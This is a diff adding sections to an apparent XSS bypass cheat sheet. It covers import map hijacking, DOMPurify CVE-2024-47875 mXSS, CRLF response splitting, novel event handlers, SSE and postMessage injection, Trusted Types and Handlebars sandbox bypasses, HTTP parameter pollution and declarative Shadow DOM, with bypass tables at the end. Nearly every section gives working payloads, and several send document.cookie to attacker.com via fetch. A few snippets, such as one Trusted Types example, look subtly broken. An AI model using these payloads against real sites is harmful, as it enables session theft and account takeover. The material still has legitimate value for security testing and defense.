@@ -1794,3 +1794,507 @@ onerror=top[/al/.source+/ert/.source];throw document.cookie
 | Nonce-based CSP on PHP pages | `max_input_vars` drops CSP header entirely | 1001+ params → PHP E_WARNING → `header()` fails silently |
 | Nonce-based CSP + CSS/HTML injection | CSS attribute selector oracle leaks nonce characters | Inject `<style>script[nonce^="X"]{...}` × all chars → reconstruct nonce |
 | `script-src 'self'` without `object-src` | `<object data=data:text/html;base64,...>` executes scripts | `<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">` |
+
+---
+
+## Import Map Injection — Module Hijacking + CSP Bypass
+
+**Type:** stored / reflected
+**Filter bypassed:** CSP `script-src` (bypassed when attacker-controlled URL is on an allowed origin); module specifier allowlisting; `base-uri` restrictions
+**Bypass logic:** `<script type="importmap">` defines a JSON map that remaps ES module specifiers to URLs before any `<script type="module">` executes. The browser processes the first importmap before module evaluation begins — a second importmap is rejected. If an attacker injects an importmap before the page's own modules load, they can remap a legitimate specifier (`./utils`, `lodash`, etc.) used by trusted scripts to an attacker-controlled URL. Critically, the browser applies `script-src` CSP to the resolved URL — so if the remapped URL lands on an already-whitelisted CDN path (or a same-origin path the attacker can write to), CSP passes. The importmap tag itself is not restricted by `script-src`; only the resolved URL is checked.
+**Attack chain:** HTML injection before first `<script type="module">` → importmap remaps specifier to attacker URL → trusted module script imports from attacker → arbitrary JS executes with page's trust → ATO
+
+**Payload:**
+```html
+<!-- Step 1: Inject importmap before any module scripts execute -->
+<script type="importmap">
+{
+  "imports": {
+    "./utils.js": "https://attacker.com/evil.js",
+    "lodash": "https://cdn.allowlisted.com/path/attacker-controlled.js"
+  }
+}
+</script>
+
+<!-- If page later runs: import { sanitize } from './utils.js' -->
+<!-- → Actually loads attacker.com/evil.js -->
+
+<!-- Variant: data: URI (works if CSP lacks script-src or allows data:) -->
+<script type="importmap">
+{"imports": {"./config": "data:text/javascript,export const token=document.cookie"}}
+</script>
+
+<!-- Variant: remap to same-origin writable path (uploaded file, open redirect) -->
+<script type="importmap">
+{"imports": {"react": "/uploads/evil.js"}}
+</script>
+
+<!-- Detection: check page source for <script type="module"> imports — -->
+<!-- any specifier string is a hijack candidate if you can inject before it -->
+```
+
+**Where to test:**
+- Any page using `<script type="module">` with named imports
+- React/Vue/Svelte apps bundled with importmap (especially dev environments)
+- Pages with HTML injection early in `<head>` before module scripts
+- Single-page apps that lazy-load modules after user interaction (race window)
+
+**Source:** https://github.com/WICG/import-maps/issues/105 ; https://github.com/Karthikdude/Advanced-XSS
+
+---
+
+## DOMPurify CVE-2024-47875 — Nesting-Based mXSS
+
+**Type:** stored / DOM
+**Filter bypassed:** DOMPurify < 2.5.0 and < 3.1.3 (all prior versions)
+**Bypass logic:** The browser's HTML parser treats `<math>` elements with `annotation-xml encoding="application/xhtml+xml"` as XHTML namespace switches. Content inside is parsed in XHTML mode, allowing `<svg>` and `<foreignObject>` to re-introduce the HTML namespace context. DOMPurify's tree-walking sanitizer sees a safe-looking structure, but when the serialized output is re-parsed by the browser via `innerHTML`, the namespace switching causes the structure to be interpreted differently — the `<img onerror>` inside the nested foreign context fires as raw HTML. The fix in 2.5.0 / 3.1.3 introduced a maximum nesting depth of 500.
+**Attack chain:** User-supplied HTML → DOMPurify.sanitize() passes it → inserted via innerHTML → browser re-parses in different namespace context → `<img onerror>` executes → arbitrary JS → ATO
+
+**Payload:**
+```html
+<!-- Core mXSS payload (CVE-2024-47875) -->
+<math>
+  <annotation-xml encoding="application/xhtml+xml">
+    <svg>
+      <foreignObject>
+        <img src=x onerror=alert(document.domain)>
+      </foreignObject>
+    </svg>
+  </annotation-xml>
+</math>
+
+<!-- With exfil -->
+<math><annotation-xml encoding="application/xhtml+xml"><svg><foreignObject>
+  <img src=x onerror="fetch('https://attacker.com/c?d='+document.cookie)">
+</foreignObject></svg></annotation-xml></math>
+
+<!-- Detection: check DOMPurify.version from browser console -->
+<!-- Affected: DOMPurify < 2.5.0 or < 3.1.3 -->
+<!-- Patch: upgrade to >= 2.5.0 (2.x branch) or >= 3.1.3 (3.x branch) -->
+```
+
+**Note:** Distinct from CVE-2024-45801 (prototype pollution depth bypass). This CVE exploits HTML parser namespace switching without requiring any prototype pollution precondition.
+
+**Source:** https://www.cve.news/cve-2024-47875/ ; https://nvd.nist.gov/vuln/detail/cve-2024-47875
+
+---
+
+## CRLF Injection → XSS (HTTP Response Splitting)
+
+**Type:** reflected
+**Filter bypassed:** Response header-only WAF inspection; XSS filters scanning only HTML body
+**Bypass logic:** CRLF characters (`\r\n`, URL-encoded as `%0d%0a`) injected into URL parameters that are reflected in HTTP response headers (Location, Set-Cookie, Refresh) split the HTTP response. A single CRLF adds a new header; two CRLFs escape the header block entirely, injecting arbitrary content into the response body where the browser executes it as HTML. Cookie poisoning variant: inject `Set-Cookie` headers with stored XSS payloads in cookie values that are later reflected in responses. Unicode bypass: U+2028 (LINE SEPARATOR) and U+2029 (PARAGRAPH SEPARATOR) normalize to newlines in some parsers and bypass `\r\n` filters.
+**Attack chain:** CRLF in redirect parameter → response body injection → HTML/JS in response → XSS fires in victim's browser → cookie theft → ATO
+
+**Payload:**
+```http
+# Basic response splitting — inject body after double CRLF
+GET /redirect?url=https://example.com%0d%0a%0d%0a<script>alert(document.cookie)</script>
+
+# In Location header
+GET /login?next=/%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<img src=x onerror=alert(1)>
+
+# Cookie poisoning via Set-Cookie injection
+GET /page?lang=en%0d%0aSet-Cookie:%20session=<script>alert(1)</script>;%20Path=/
+
+# Inject CSP-disabling header + XSS payload
+GET /redirect?to=x%0d%0aContent-Security-Policy:%20default-src%20*%0d%0a%0d%0a<svg onload=alert(1)>
+
+# Unicode LINE SEPARATOR bypass (U+2028 = %E2%80%A8)
+GET /redirect?url=https://safe.com%E2%80%A8%E2%80%A8<script>alert(1)</script>
+
+# Akamai WAF bypass via injected Content-Encoding (CRLF + CRLF in Host)
+# Host: target.com%0d%0aContent-Encoding:%20identity
+```
+
+**Testing methodology:**
+```
+1. Find parameters reflected in response headers (Location, Refresh, Set-Cookie, X-*)
+2. Inject %0d%0a and check if the injected value appears as a new header
+3. Inject %0d%0a%0d%0a to escape headers into body
+4. Also test: X-Forwarded-Host, X-Original-URL, Referer, Origin headers
+5. Check for U+2028/U+2029 bypass if %0d%0a is filtered
+```
+
+**Source:** https://www.vaadata.com/blog/what-is-crlf-injection-exploitations-and-security-tips/ ; https://www.praetorian.com/blog/using-crlf-injection-to-bypass-akamai-web-app-firewall/
+
+---
+
+## New Browser Event Handlers — WAF Bypass (2025)
+
+**Type:** reflected / stored
+**Filter bypassed:** WAF blocklists using static event handler allowlists (only blocks `onclick`, `onmouseover`, `onkeypress`, etc.)
+**Bypass logic:** Chrome 109+, Chrome 114+, and Firefox 109+ shipped new DOM event handlers that are absent from most WAF signature databases. These handlers are syntactically identical to classic handlers but fire on modern browser interactions that WAFs haven't catalogued. Because they're standard W3C events, browsers execute them natively — no JS tricks needed.
+**Attack chain:** WAF sees unknown attribute name → passes → browser fires event → XSS executes → ATO
+
+**Payload:**
+```html
+<!-- onscrollend — fires when scrolling stops (Chrome 114+, Firefox 109+) -->
+<div onscrollend=alert(1) style="overflow:auto;width:1px;height:100px">
+  <div style="height:500px">scroll me</div>
+</div>
+
+<!-- onpointerrawupdate — fires on raw pointer movement (Chrome 77+) -->
+<!-- Executes as soon as mouse enters element — no click needed -->
+<div onpointerrawupdate=alert(1) style="width:100%;height:100px">hover</div>
+
+<!-- onbeforetoggle — fires before <details>/<dialog> toggles (Chrome 114+) -->
+<details onbeforetoggle=alert(1) open>summary</details>
+
+<!-- onsecuritypolicyviolation — fires when CSP blocks something -->
+<!-- Useful for detection: know if CSP is active without triggering it -->
+<script onsecuritypolicyviolation=fetch('//attacker.com/csp?v='+event.violatedDirective)>
+  eval('blocked')  <!-- triggers violation, handler exfils directive -->
+</script>
+
+<!-- onpageswap / onpagereveal — View Transitions API (Chrome 126+) -->
+<body onpageswap=alert(1)><!-- fires on navigate-away -->
+<body onpagereveal=alert(1)><!-- fires on navigate-to -->
+
+<!-- Combined mobile+desktop fallback with new handlers -->
+<div
+  onscrollend=alert(document.cookie)
+  onpointerrawupdate=alert(document.cookie)
+  ontouchstart=alert(document.cookie)
+  onclick=alert(document.cookie)
+  style="width:100%;height:100px;overflow:auto">x</div>
+```
+
+**Recon strategy:**
+```
+1. Use PortSwigger's XSS cheat sheet event handler list to fuzz all known handlers
+2. For each WAF-blocked handler, try: onscrollend, onpointerrawupdate, onbeforetoggle,
+   onpageswap, onpagereveal, onsecuritypolicyviolation, onclosedpopover
+3. Check if target browsers support the handler via MDN compatibility tables
+4. Combine with user-interaction-free triggers: autofocus, open attribute, CSS auto-scroll
+```
+
+**Source:** https://www.infigo.hr/en/insights/46/introducing-novel-event-handler-xss-techniques/ ; https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+
+---
+
+## Server-Sent Events (SSE) DOM XSS
+
+**Type:** DOM
+**Filter bypassed:** Traditional HTTP XSS scanners (miss streaming responses); server-side sanitizers that validate HTTP request params but not SSE stream content
+**Bypass logic:** Server-Sent Events use `EventSource` to receive a persistent stream of server-pushed `text/event-stream` messages. If JS on the page inserts `event.data` from SSE messages into DOM sinks (innerHTML, eval, document.write) without sanitization, it's a DOM XSS vector. Attack paths: (1) Direct SSE injection — if user-controlled data flows into the SSE event stream server-side; (2) CRLF injection into the SSE stream — HTTP response splitting with SSE-format payloads (`data: <img...>\n\n`) to inject fake events; (3) SSE hijacking — on non-HTTPS connections via MitM.
+**Attack chain:** Attacker data reaches SSE stream → `onmessage` handler → unsafe DOM insertion → XSS fires for all active SSE subscribers → session theft
+
+**Payload:**
+```javascript
+// Vulnerable SSE handler pattern (server sends user-controlled data):
+var evtSource = new EventSource('/notifications');
+evtSource.onmessage = function(e) {
+    document.getElementById('notifications').innerHTML += e.data;  // sink: innerHTML
+};
+
+// If attacker can inject into the SSE stream:
+// data: <img src=x onerror=alert(document.cookie)>\n\n
+// → innerHTML receives the payload → XSS fires
+
+// CRLF + SSE injection (if HTTP path is injectable):
+// GET /stream?user=alice%0d%0adata:%20<img src=x onerror=alert(1)>%0d%0a%0d%0a
+// → Injects a fake SSE event into the response stream
+
+// Test from Burp: intercept SSE response, modify event data to include XSS payload
+// In EventStream viewer: add "data: <svg onload=alert(1)>" + double newline
+
+// Exfil payload for SSE-based XSS:
+// data: <script>fetch('https://attacker.com/c?d='+btoa(document.cookie))</script>
+```
+
+**Detection steps:**
+```
+1. DevTools → Network → filter by "EventStream" type
+2. Observe event data — find any that reflects user-controlled input
+3. Send a test string via the injection point; watch for it in the SSE stream
+4. If reflected: inject XSS payload and watch for innerHTML/eval execution
+5. Also check: WebSocket + SSE hybrid patterns where one feeds the other
+```
+
+**Source:** https://github.com/Karthikdude/Advanced-XSS ; https://medium.com/@instatunnel/crlf-injection-injecting-new-lines-hijacking-responses-f3c8ceaae377
+
+---
+
+## Trusted Types Policy Bypass
+
+**Type:** DOM
+**Filter bypassed:** `require-trusted-types-for 'script'` CSP directive — normally blocks all direct string assignments to dangerous sinks
+**Bypass logic:** Trusted Types forces all assignments to sinks like `innerHTML`, `eval`, `setTimeout` (string form) to go through a registered policy's `createHTML`/`createScript` functions. Three bypass paths: (1) **Missing `trusted-types` directive** — if only `require-trusted-types-for 'script'` is set but not `trusted-types 'policy-name'`, any policy name is allowed, letting attackers call `trustedTypes.createPolicy('bypass', {createHTML: s => s})` to create a passthrough; (2) **Prototype pollution** — polluting `Object.prototype` so the policy's `createHTML` method is replaced before it's called; (3) **`allow-duplicates` keyword** — if CSP uses `trusted-types * 'allow-duplicates'`, a later `createPolicy` call with the same name overwrites the legitimate policy with a passthrough one.
+**Attack chain:** Trusted Types in force → missing/permissive policy config → attacker creates bypass policy → assigns raw HTML to innerHTML → XSS → ATO
+
+**Payload:**
+```javascript
+// Path 1: No trusted-types policy restriction (only require-trusted-types-for set)
+// CSP: require-trusted-types-for 'script' (no "trusted-types" directive)
+// → Any policy name is allowed:
+const bypassPolicy = trustedTypes.createPolicy('bypass', {
+    createHTML: (s) => s,       // passthrough — no sanitization
+    createScript: (s) => s,
+    createScriptURL: (s) => s
+});
+document.body.innerHTML = bypassPolicy.createHTML('<img src=x onerror=alert(1)>');
+
+// Path 2: Prototype pollution → replace createHTML on policy object
+// (requires prior prototype pollution vector on the page)
+Object.prototype.createHTML = function(s) { return s; };  // polluted
+// Now any policy.createHTML('payload') returns the raw string instead of sanitized version
+const policy = trustedTypes.createPolicy('app', { createHTML: DOMPurify.sanitize });
+document.body.innerHTML = policy.createHTML('<img src=x onerror=alert(1)>');
+// → polluted Object.prototype.createHTML is called → raw payload returned → XSS
+
+// Path 3: allow-duplicates policy overwrite
+// CSP: trusted-types app 'allow-duplicates'; require-trusted-types-for 'script'
+// Step 1 (app creates legitimate policy):
+// trustedTypes.createPolicy('app', { createHTML: DOMPurify.sanitize })
+// Step 2 (attacker overwrites — requires JS execution foothold already):
+trustedTypes.createPolicy('app', { createHTML: (s) => s });  // overwrites with passthrough
+document.body.innerHTML = trustedTypes.getAttributeType('div','innerHTML')
+// → now uses attacker's passthrough policy
+
+// Detection: check CSP header for "trusted-types" and "require-trusted-types-for"
+// Test: trustedTypes.getPolicyNames() in browser console → see registered policy names
+// Audit: if policy list is empty or contains 'default', bypass is likely possible
+```
+
+**CSP hardening:** `trusted-types app-policy; require-trusted-types-for 'script'` (no wildcard, no `allow-duplicates`).
+
+**Source:** https://developer.chrome.com/docs/lighthouse/best-practices/trusted-types-xss ; https://github.com/Karthikdude/Advanced-XSS
+
+---
+
+## HTTP Parameter Pollution (HPP) WAF Bypass
+
+**Type:** reflected / stored
+**Filter bypassed:** AWS WAF, Cloudflare, ModSecurity — WAFs that inspect only the first (or only one) occurrence of a repeated parameter
+**Bypass logic:** HTTP allows multiple values for the same parameter name. Different backend servers merge duplicate parameters differently: PHP/Apache use the last value; ASP.NET joins all with a comma; Tomcat uses the first. WAFs often inspect only the first occurrence for payload detection. Sending a benign value first followed by the XSS payload means the WAF sees `safe` while the vulnerable app processes `<script>alert(1)</script>`.
+**Attack chain:** WAF inspects first param value (safe) → passes → backend uses last/merged value (XSS payload) → reflected in response → XSS fires
+
+**Payload:**
+```http
+# PHP/Apache — backend uses LAST value, WAF inspects FIRST
+GET /search?q=hello&q=<script>alert(1)</script>
+POST /comment
+q=safe_value&q=<img src=x onerror=alert(document.cookie)>
+
+# ASP.NET — backend joins with comma: "safe,<payload>" → may break out of string context
+GET /search?q=';alert(1)//&q=hello
+
+# AWS WAF bypass — pad request beyond 8KB inspection threshold
+# Send 8000+ bytes of padding in first params, then XSS payload in last
+GET /search?junk=AAAA...AAAA(x8000)&q=<script>alert(1)</script>
+
+# Parameter name pollution — some frameworks accept alt names
+?q=hello&search=<script>alert(1)</script>
+?query=safe&q=<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>
+
+# JSON body HPP (some APIs accept array for single-value fields)
+{"q": ["safe", "<img src=x onerror=alert(1)>"]}
+# Backend extracts arr[0] or arr[1] depending on implementation
+
+# URL fragment pollution (fragment not sent to server but reflected in JS)
+/search?q=safe#q=<img src=x onerror=alert(1)>
+```
+
+**Testing checklist:**
+```
+1. Find reflected parameters
+2. Send: param=safe&param=<xss>
+3. Check response for <xss> presence (backend used second value)
+4. If safe only: try param=<xss>&param=safe (backend used first value)
+5. Check for comma-joined: "safe,<xss>" in response (ASP.NET pattern)
+6. Try JSON array body for API endpoints
+7. Combine with encoding: second param URL-encoded, first plain
+```
+
+**Source:** https://github.com/Karthikdude/Advanced-XSS ; https://github.com/ERO-HACK/bypassXSS
+
+---
+
+## postMessage Null Origin — Sandboxed Iframe Bypass
+
+**Type:** DOM
+**Filter bypassed:** `e.origin` allowlist checks (`e.origin !== 'null'` patterns, origin equality checks)
+**Bypass logic:** Sandboxed `<iframe>` elements without the `allow-same-origin` flag run in a unique origin and have `window.origin === 'null'` (the string "null"). When such an iframe posts a message, `event.origin` on the receiver is the string `"null"`. Apps that check `e.origin !== window.location.origin` will reject messages from unexpected origins — but many check `if (allowedOrigins.includes(e.origin))` or `if (e.origin.startsWith('https://'))`. Neither catches `"null"`. An attacker on any domain can create a sandboxed iframe that sends postMessages with `origin: "null"`, bypassing origin allowlists that don't explicitly handle the null case.
+**Attack chain:** Attacker page creates sandboxed iframe → iframe posts message with `origin: "null"` → victim listener doesn't check for `"null"` → message data flows into DOM sink → XSS
+
+**Payload:**
+```html
+<!-- Attacker's page (any origin) — sandboxed iframe sends "null"-origin message -->
+<iframe
+  sandbox="allow-scripts"
+  srcdoc="
+    <script>
+      parent.postMessage({
+        type: 'config',
+        html: '<img src=x onerror=alert(document.domain)>',
+        sender: 'trusted-app'
+      }, '*');
+    </script>
+  ">
+</iframe>
+
+<!-- Victim page listener (vulnerable pattern): -->
+window.addEventListener('message', function(e) {
+    // BUG: doesn't handle e.origin === 'null'
+    if (allowedOrigins.includes(e.origin)) {   // 'null' not in list → fails
+        document.getElementById('content').innerHTML = e.data.html;
+    }
+    // Worse: no check at all
+    if (e.data.type === 'config') {
+        document.getElementById('content').innerHTML = e.data.html;  // direct sink
+    }
+});
+
+<!-- PoC for origin: "null" bypass -->
+// Many apps also have this vulnerable pattern:
+if (e.origin === 'null' || e.origin.endsWith('.trusted.com')) { ... }
+// → explicitly allows null origin → trivially exploitable
+
+<!-- Defense: reject null origin explicitly -->
+if (e.origin === 'null' || !allowedOrigins.includes(e.origin)) return;
+```
+
+**Source:** https://github.com/Karthikdude/Advanced-XSS ; https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking
+
+---
+
+## Handlebars Client-Side Template Injection (CSTI)
+
+**Type:** stored / reflected (client-side template injection)
+**Filter bypassed:** Handlebars sandbox / expression restrictions
+**Bypass logic:** Handlebars templates process `{{expression}}` blocks client-side. The `#with` helper sets context, and nested `#with` blocks can walk the prototype chain. `"constructor"` is a string, and strings have a `constructor` that is `String`. `String.constructor` is `Function`. Nesting `#with "constructor"` then accessing the outer `constructor` of that value chains to `Function`, which can execute arbitrary code. This is a pure client-side injection with no server involvement if the template is compiled and rendered in the browser.
+**Attack chain:** User input reflected in Handlebars template context → `#with` chain reaches `Function` constructor → `call('alert(1)')` → arbitrary JS → ATO
+
+**Payload:**
+```javascript
+// Basic Handlebars CSTI via nested #with
+{{#with "constructor"}}
+  {{#with ../constructor}}
+    {{../constructor.constructor("alert(document.cookie)")()}}
+  {{/with}}
+{{/with}}
+
+// Shorter form (some versions):
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return fetch('https://attacker.com?c='+document.cookie)"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+
+// Direct payload (older Handlebars pre-v4.6.0 sandbox):
+{{constructor.constructor("alert(1)")()}}
+
+// Via prototype chain
+{{__proto__.constructor.constructor("alert(1)")()}}
+
+// Exfil payload
+{{#with "constructor"}}{{#with ../constructor}}{{../constructor.constructor("fetch('https://attacker.com/c?d='+document.cookie)")()}}{{/with}}{{/with}}
+```
+
+**Where to test:** Apps using client-side Handlebars rendering with user input in template context (chat apps, Ember.js apps, any `Handlebars.compile(userInput)` pattern).
+
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection ; https://github.com/Karthikdude/Advanced-XSS
+
+---
+
+## Shadow DOM Declarative — Sanitizer Bypass
+
+**Type:** stored / DOM
+**Filter bypassed:** DOMPurify, sanitize-html, and any tree-walking sanitizer that uses `childNodes` traversal; `setHTML()` Sanitizer API (partially, in affected versions)
+**Bypass logic:** The Declarative Shadow DOM spec (`<template shadowrootmode="open">`) creates a shadow root during HTML parsing — before any sanitizer gets to walk the DOM tree. Tree-walking sanitizers that iterate `childNodes` do not enter shadow roots created declaratively because shadow roots are not part of the light DOM tree they traverse. A payload placed inside `<template shadowrootmode="open">` is invisible to the sanitizer but renders and executes when the component is attached to the document. This affects sanitizers that parse via `DOMParser` or `innerHTML` and then walk the resulting tree.
+**Attack chain:** HTML injection with declarative shadow root → sanitizer walks light DOM (doesn't enter shadow) → output re-inserted into page → shadow root attaches → `<script>` inside shadow executes → XSS → ATO
+
+**Payload:**
+```html
+<!-- Declarative Shadow DOM — sanitizer misses content inside -->
+<div>
+  <template shadowrootmode="open">
+    <script>alert(document.domain)</script>
+  </template>
+</div>
+
+<!-- With event handler instead of script (for sanitizers that block <script>) -->
+<div>
+  <template shadowrootmode="open">
+    <img src=x onerror=alert(document.cookie)>
+  </template>
+</div>
+
+<!-- Closed shadow root (harder to inspect/remove) -->
+<div>
+  <template shadowrootmode="closed">
+    <img src=x onerror=fetch('https://attacker.com/c?d='+document.cookie)>
+  </template>
+</div>
+
+<!-- Combined with mXSS to break out of sanitizer entirely -->
+<math><annotation-xml encoding="application/xhtml+xml">
+  <template xmlns="http://www.w3.org/1999/xhtml" shadowrootmode="open">
+    <img src=x onerror=alert(1)>
+  </template>
+</annotation-xml></math>
+
+<!-- Test: send payload to sanitizer, re-render output, check shadow root -->
+var out = DOMPurify.sanitize('<div><template shadowrootmode="open"><img src=x onerror=alert(1)></template></div>');
+document.body.innerHTML = out;
+// → check if shadow root was preserved and img fires
+```
+
+**Note:** Modern DOMPurify (>= 3.1.1) added shadow DOM stripping. Test against the version actually deployed. The `setHTML()` browser API is also hardened against this, but library-based sanitizers lag.
+
+**Source:** https://github.com/mfreed7/declarative-shadow-dom/blob/master/README.md ; https://github.com/Karthikdude/Advanced-XSS
+
+---
+
+## Bypass Matrix (Updated 2026-05-31)
+
+### New Entries — Techniques Added 2026-05-31
+
+| Filter / Defense | Bypass Technique | Payload Example |
+|-----------------|------------------|-----------------|
+| CSP `script-src` (module specifier allowlist) | Import map injection — remap specifier before modules load | `<script type="importmap">{"imports":{"./utils":"data:text/javascript,alert(1)"}}</script>` |
+| DOMPurify < 2.5.0 / < 3.1.3 | CVE-2024-47875: math annotation-xml namespace mXSS | `<math><annotation-xml encoding="application/xhtml+xml"><svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg></annotation-xml></math>` |
+| Header-only WAF | CRLF injection → response body injection | `%0d%0a%0d%0a<script>alert(1)</script>` in Location param |
+| Set-Cookie header filter | CRLF → cookie poisoning with XSS value | `%0d%0aSet-Cookie:%20x=<script>alert(1)</script>` |
+| WAF event handler blocklist (static list) | New event handlers: `onscrollend`, `onpointerrawupdate`, `onbeforetoggle` | `<div onscrollend=alert(1) style="overflow:auto;height:100px"><div style="height:500px">x</div></div>` |
+| HTTP-only scanner (misses SSE stream) | SSE message injection → innerHTML sink | Inject `data: <img src=x onerror=alert(1)>` + `\n\n` into SSE stream |
+| `require-trusted-types-for 'script'` (no policy restriction) | Create passthrough TT policy | `trustedTypes.createPolicy('bypass',{createHTML:s=>s})` |
+| `require-trusted-types-for` + prototype pollution | Pollute `createHTML` on policy object | `Object.prototype.createHTML = s => s` |
+| WAF inspects first param only | HTTP Parameter Pollution (HPP) | `?q=safe&q=<script>alert(1)</script>` (PHP uses last value) |
+| `e.origin` allowlist (no null check) | postMessage from sandboxed iframe (origin: "null") | `<iframe sandbox="allow-scripts" srcdoc="<script>parent.postMessage('XSS','*')</script>">` |
+| Handlebars template sandbox | Nested `#with` → `Function` constructor chain | `{{#with "constructor"}}{{#with ../constructor}}{{../constructor.constructor("alert(1)")()}}{{/with}}{{/with}}` |
+| Tree-walking sanitizer (DOMPurify, sanitize-html) | Declarative Shadow DOM — content invisible to childNodes walk | `<template shadowrootmode="open"><img src=x onerror=alert(1)></template>` |
+
+### New Sinks Documented 2026-05-31
+
+| Sink | Context | Notes |
+|------|---------|-------|
+| `EventSource.onmessage → innerHTML` | DOM / real-time SSE | Server-pushed event data flows into DOM; SSE bypasses most HTTP WAF inspection |
+| `trustedTypes.createPolicy().createHTML` | Trusted Types passthrough | Policy with identity function defeats TT protection entirely |
+| ES module via importmap specifier | Import map hijack | Browser resolves module URL from injected map before first module script runs |
+| `shadowRoot.innerHTML` (via declarative template) | Declarative Shadow DOM | Content inserted before sanitizer traversal; shadow root invisible to childNodes |
+| `document.cookie` via CRLF Set-Cookie | CRLF → cookie poisoning | Injected Set-Cookie creates new cookie with XSS payload; reflected later |
+
+### CSP Configurations — New Weaknesses (2026-05-31)
+
+| CSP Configuration | Weakness | Bypass |
+|------------------|----------|--------|
+| `script-src 'nonce-XYZ'` + page uses `<script type="module">` | Importmap injection remaps module specifier to attacker URL | Inject importmap before module scripts; remap specifier to whitelisted CDN path attacker controls |
+| `require-trusted-types-for 'script'` (no `trusted-types` directive) | Any policy name allowed → passthrough policy creatable | `trustedTypes.createPolicy('bypass', {createHTML: s => s})` |
+| `require-trusted-types-for 'script'; trusted-types * 'allow-duplicates'` | Wildcard + allow-duplicates → overwrite any policy | Create second policy with same name as app policy; replace `createHTML` with passthrough |
+| Any CSP on PHP pages (via `header()`) | Parameters reflected in Location/Set-Cookie headers → CRLF injection drops CSP | Inject `%0d%0aContent-Security-Policy:%20default-src%20*` before `%0d%0a%0d%0a<XSS>` |
